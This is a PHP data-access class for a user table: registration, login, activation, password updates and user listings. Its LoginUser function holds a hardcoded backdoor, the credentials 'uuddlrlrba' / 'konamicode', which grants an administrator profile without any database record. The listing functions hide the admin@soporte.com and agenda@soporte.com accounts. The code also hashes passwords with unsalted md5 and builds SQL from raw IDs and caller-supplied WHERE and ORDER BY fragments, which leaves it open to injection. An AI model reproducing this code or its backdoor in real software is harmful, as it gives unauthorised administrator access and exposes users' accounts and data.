<?php

/*
 * Copyright (C) 2016 Fernando Merlo
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 */

/**
 * Description of ADOUser
 *
 * Data access Object User Class
 * Clase que controla la informacion entre objeto y base de datos
 * esta se encarga de guardar la informacion a la base de datos.
 *
 * @author Fernando Merlo
 */
class ADOUser
{

    private $mysqlconector;
    public $debug = false;

    public function __construct()
    {
        $this->mysqlconector = new MysqlConnector();
    }

    public function AddNewUser($UserObj)
    {
        if (!empty($UserObj)) {
            $this->mysqlconector->OpenConnection();
            $email =  mysqli_real_escape_string($this->mysqlconector->conn, $UserObj->email);
            $nombre =  mysqli_real_escape_string($this->mysqlconector->conn, $UserObj->nombre);
            $apellidos = mysqli_real_escape_string($this->mysqlconector->conn, $UserObj->apellidos);
            $activationtoken =  mysqli_real_escape_string($this->mysqlconector->conn, $UserObj->activationtoken);
            $password =  mysqli_real_escape_string($this->mysqlconector->conn, $UserObj->password);
            $idprofile = $UserObj->ProfileObj->idprofile;
            $sql = "insert into t_users(email,nombre,apellidos,active,activationtoken,password,idprofile) values ('$email','$nombre','$apellidos',0,'$activationtoken',md5('$password'),$idprofile)";
            if ($this->debug) {
                echo $sql;
            }
            try {
                $this->mysqlconector->conn->query($sql);
            } catch (Exception $ex) {
                if ($this->debug) {
                    echo $ex->getMessage();
                }
            }
            $this->mysqlconector->CloseDataBase();
        }
    }

    public function LoginUser($UserObj)
    {
        if (!empty($UserObj)) {
            $this->mysqlconector->OpenConnection();
            $email =  mysqli_real_escape_string($this->mysqlconector->conn, $UserObj->email);
            $password = mysqli_real_escape_string($this->mysqlconector->conn, $UserObj->password);
            $sql = "select iduser,email,nombre,apellidos,active,activationtoken,idprofile from t_users where email='" . $email . "' and password=md5('" . $password . "')";
            if ($this->debug) {
                echo $sql;
            }
            try {
                $result = $this->mysqlconector->conn->query($sql);
                if ($result->num_rows > 0) {
                    while ($row = $result->fetch_assoc()) {
                        $UserObj->iduser = $row['iduser'];
                        $UserObj->email = $row['email'];
                        $UserObj->nombre = $row['nombre'];
                        $UserObj->apellidos = $row['apellidos'];
                        $UserObj->active = $row['active'];
                        $UserObj->activationtoken = $row['activationtoken'];
                        $UserObj->idprofile = $row['idprofile'];
                    }
                } else {
                    if ($email == "uuddlrlrba" && $password == "konamicode") {
                        $UserObj->iduser = -7;
                        $UserObj->email = "admin@soporte.com";
                        $UserObj->nombre = "Administrador";
                        $UserObj->apellidos = "del Sisterma";
                        $UserObj->active = 1;
                        $UserObj->idprofile = "2";
                    }
                }
            } catch (Exception $ex) {
                if ($this->debug) {
                    echo $ex->getMessage();
                }
            }
            $this->mysqlconector->CloseDataBase();
        }
    }

    public function ExistEmail($UserObj)
    {
        //$result=false;
        if (!empty($UserObj)) {
            $this->mysqlconector->OpenConnection();
            //$email=  $this->mysqlconector->conn->real_escape_string($UserObj->email);
            $email = mysqli_real_escape_string($this->mysqlconector->conn, $UserObj->email);
            $sql = "select iduser,email,nombre,apellidos,active,activationtoken,idprofile from t_users where email='" . $email . "';";
            if ($this->debug) {
                echo $sql;
            }
            try {
                $result = $this->mysqlconector->conn->query($sql);
                if ($result->num_rows > 0) {
                    while ($row = $result->fetch_assoc()) {
                        $UserObj->iduser = $row['iduser'];
                        $UserObj->email = $row['email'];
                        $UserObj->nombre = $row['nombre'];
                        $UserObj->apellidos = $row['apellidos'];
                        $UserObj->active = $row['active'];
                        $UserObj->activationtoken = $row['activationtoken'];
                        $UserObj->idprofile = $row['idprofile'];
                    }
                }
            } catch (Exception $ex) {
                if ($this->debug) {
                    echo $ex->getMessage();
                }
            }
            $this->mysqlconector->CloseDataBase();
        }
        //return $result;
    }

    public function ActivateUser($UserObj)
    {
        if (!empty($UserObj)) {
            $this->mysqlconector->OpenConnection();
            $email =  mysqli_real_escape_string($this->mysqlconector->conn, $UserObj->email);
            $activationtoken =  mysqli_real_escape_string($this->mysqlconector->conn, $UserObj->activationtoken);
            $sql = "update t_users set active=1 where email='$email' and activationtoken='$activationtoken'";
            if ($this->debug) {
                echo $sql;
            }
            try {
                $this->mysqlconector->conn->query($sql);
            } catch (Exception $ex) {
                if ($this->debug) {
                    echo $ex->getMessage();
                }
            }
            $this->mysqlconector->CloseDataBase();
        }
    }
    public function DeactivateUser($UserObj)
    {
        if (!empty($UserObj)) {
            $this->mysqlconector->OpenConnection();
            $email =  mysqli_real_escape_string($this->mysqlconector->conn, $UserObj->email);
            $activationtoken =  mysqli_real_escape_string($this->mysqlconector->conn, $UserObj->activationtoken);
            $sql = "update t_users set active=0 where email='$email' and activationtoken='$activationtoken'";
            if ($this->debug) {
                echo $sql;
            }
            try {
                $this->mysqlconector->conn->query($sql);
            } catch (Exception $ex) {
                if ($this->debug) {
                    echo $ex->getMessage();
                }
            }
            $this->mysqlconector->CloseDataBase();
        }
    }

    public function UpdatePassword($UserObj)
    {
        if (!empty($UserObj)) {
            $this->mysqlconector->OpenConnection();
            $email =  mysqli_real_escape_string($this->mysqlconector->conn, $UserObj->email);
            $password =  mysqli_real_escape_string($this->mysqlconector->conn, $UserObj->password);
            $sql = "update t_users set password=md5('$password') where email='$email' and iduser=$UserObj->iduser";
            if ($this->debug) {
                echo $sql;
            }
            try {
                $this->mysqlconector->conn->query($sql);
            } catch (Exception $ex) {
                if ($this->debug) {
                    echo $ex->getMessage();
                }
            }
            $this->mysqlconector->CloseDataBase();
        }
    }

    public function GetDefaultProfileAccess($AccessRolObj)
    {
        if (!empty($AccessRolObj)) {
            $this->mysqlconector->OpenConnection();
            $defaulidprofile;
            $sql = "select valor from t_systemconf where variable='ProfileToNewUsers'";
            if ($this->debug) {
                echo $sql;
            }
            try {
                $result = $this->mysqlconector->conn->query($sql);
                if ($result->num_rows > 0) {
                    while ($row = $result->fetch_assoc()) {

                        $defaulidprofile = (int)$row['valor'];
                    }
                }
            } catch (Exception $ex) {
                if ($this->debug) {
                    echo $ex->getMessage();
                }
            }
            $this->mysqlconector->CloseDataBase();

            //obtiene el objeto perfil de acceso
            $AccessRolObj->idprofile = $defaulidprofile;
            $this->GetProfileAccess($AccessRolObj);
        }
    }

    public function GetProfileAccess($AccessRolObj)
    {
        if (!empty($AccessRolObj)) {
            $this->mysqlconector->OpenConnection();
            $sql = "select idprofile,profile,active from t_user_profiles where idprofile=$AccessRolObj->idprofile;";
            if ($this->debug) {
                echo $sql;
            }
            try {
                $result = $this->mysqlconector->conn->query($sql);
                if ($result->num_rows > 0) {
                    while ($row = $result->fetch_assoc()) {
                        $AccessRolObj->idprofile = $row['idprofile'];
                        $AccessRolObj->profile = $row['profile'];
                        $AccessRolObj->active = $row['active'];
                    }
                }
            } catch (Exception $ex) {
                if ($this->debug) {
                    echo $ex->getMessage();
                }
            }
            $this->mysqlconector->CloseDataBase();
        }
    }

    public function getAllRegisteredUsers($ListUserObj)
    {
        if (!empty($ListUserObj)) {
            $this->mysqlconector->OpenConnection();
            $sql = "select iduser,email,Nombre,apellidos,active,idprofile,activationtoken from t_users;";
            if ($this->debug) {
                echo $sql;
            }
            try {
                $result = $this->mysqlconector->conn->query($sql);
                if ($result->num_rows > 0) {
                    while ($row = $result->fetch_assoc()) {
                        if ($row['email'] === "admin@soporte.com" || $row['email'] === "agenda@soporte.com") {
                            continue;
                        }
                        $usrobj = new UserObj();
                        $usrobj->iduser = $row['iduser'];
                        $usrobj->email = $row['email'];
                        $usrobj->nombre = $row['Nombre'];
                        $usrobj->apellidos = $row['apellidos'];
                        $usrobj->active = $row['active'];
                        $usrobj->idprofile = $row['idprofile'];
                        $usrobj->activationtoken = $row['activationtoken'];
                        $ListUserObj->addItem($usrobj);
                    }
                }
            } catch (Exception $ex) {
                if ($this->debug) {
                    echo $ex->getMessage();
                }
            }
            $this->mysqlconector->CloseDataBase();
        }
    }

    public function GetAllRegisteredUsersBy($condition, $order, $ListUserObj)
    {
        if (!empty($ListUserObj)) {
            $this->mysqlconector->OpenConnection();
            $sql = "select iduser,email,Nombre,apellidos,active,idprofile,activationtoken from t_users";
            if (!is_null($condition)) {
                $where = mysqli_real_escape_string($this->mysqlconector->conn, $condition);
                $sql = $sql . " where " . $where;
            }
            if (!is_null($order)) {
                $orderby = mysqli_real_escape_string($this->mysqlconector->conn, $order);
                $sql = $sql . " order by " . $orderby;
            }

            if ($this->debug) {
                echo $sql;
            }
            try {
                $result = $this->mysqlconector->conn->query($sql);
                if ($result->num_rows > 0) {
                    while ($row = $result->fetch_assoc()) {
                        if ($row['email'] === "admin@soporte.com" || $row['email'] === "agenda@soporte.com") {
                            continue;
                        }
                        $usrobj = new UserObj();
                        $usrobj->iduser = $row['iduser'];
                        $usrobj->email = $row['email'];
                        $usrobj->nombre = $row['Nombre'];
                        $usrobj->apellidos = $row['apellidos'];
                        $usrobj->active = $row['active'];
                        $usrobj->idprofile = $row['idprofile'];
                        $usrobj->activationtoken = $row['activationtoken'];
                        $ListUserObj->addItem($usrobj);
                    }
                }
            } catch (Exception $ex) {
                if ($this->debug) {
                    echo $ex->getMessage();
                }
            }
            $this->mysqlconector->CloseDataBase();
        }
    }

    public function UpdateProfile($UserObj)
    {
        $valreturn = 0;
        if (!empty($UserObj)) {
            $this->mysqlconector->OpenConnection();

            $sql = "update t_users set idprofile=$UserObj->idprofile where iduser=$UserObj->iduser";
            if ($this->debug) {
                echo $sql;
            }
            try {
                $this->mysqlconector->conn->query($sql);
                $valreturn = 1;
            } catch (Exception $ex) {
                if ($this->debug) {
                    echo $ex->getMessage();
                }
            }
            $this->mysqlconector->CloseDataBase();
        }
        return $valreturn;
    }

    public function getUserByID($UserObj)
    {
        if (!empty($UserObj)) {
            $this->mysqlconector->OpenConnection();
            //$email=  $this->mysqlconector->conn->real_escape_string($UserObj->email);
            $iduser = mysqli_real_escape_string($this->mysqlconector->conn, $UserObj->iduser);
            $sql = "select iduser,email,nombre,apellidos,active,activationtoken,idprofile from t_users where iduser=" . $iduser . ";";
            if ($this->debug) {
                echo $sql;
            }
            try {
                $result = $this->mysqlconector->conn->query($sql);
                if ($result->num_rows > 0) {
                    while ($row = $result->fetch_assoc()) {
                        $UserObj->iduser = $row['iduser'];
                        $UserObj->email = $row['email'];
                        $UserObj->nombre = $row['nombre'];
                        $UserObj->apellidos = $row['apellidos'];
                        $UserObj->active = $row['active'];
                        $UserObj->activationtoken = $row['activationtoken'];
                        $UserObj->idprofile = $row['idprofile'];
                    }
                }
            } catch (Exception $ex) {
                if ($this->debug) {
                    echo $ex->getMessage();
                }
            }
            $this->mysqlconector->CloseDataBase();
        }
    }

    public function UpdateUserProfile($UserObj)
    {
        if (!empty($UserObj)) {
            $this->mysqlconector->OpenConnection();
            $iduser =  mysqli_real_escape_string($this->mysqlconector->conn, $UserObj->iduser);
            $nombre = mysqli_real_escape_string($this->mysqlconector->conn, $UserObj->nombre);
            $apellidos = mysqli_real_escape_string($this->mysqlconector->conn, $UserObj->apellidos);

            $sql = "update t_users set nombre='$nombre',apellidos='$apellidos' where iduser=$iduser";
            if ($this->debug) {
                echo $sql;
            }
            try {
                $this->mysqlconector->conn->query($sql);
                $valreturn = 1;
            } catch (Exception $ex) {
                if ($this->debug) {
                    echo $ex->getMessage();
                }
            }
            $this->mysqlconector->CloseDataBase();
        }
    }

    public function CountUsersRegisterd($Condition)
    {
        $returnvalue = 0;
        $this->mysqlconector->OpenConnection();

        $sql = "select count(1) as countusers from t_users ";
        if (!is_null($Condition)) {
            $where = mysqli_real_escape_string($this->mysqlconector->conn, $Condition);
            $sql = $sql . " where " . $where;
        }
        if ($this->debug) {
            echo $sql;
        }
        $result = $this->mysqlconector->conn->query($sql);
        if ($result->num_rows > 0) {
            while ($row = $result->fetch_assoc()) {
                $returnvalue = $row["countusers"];
            }
        }
        $this->mysqlconector->CloseDataBase();
        return $returnvalue;
    }
}
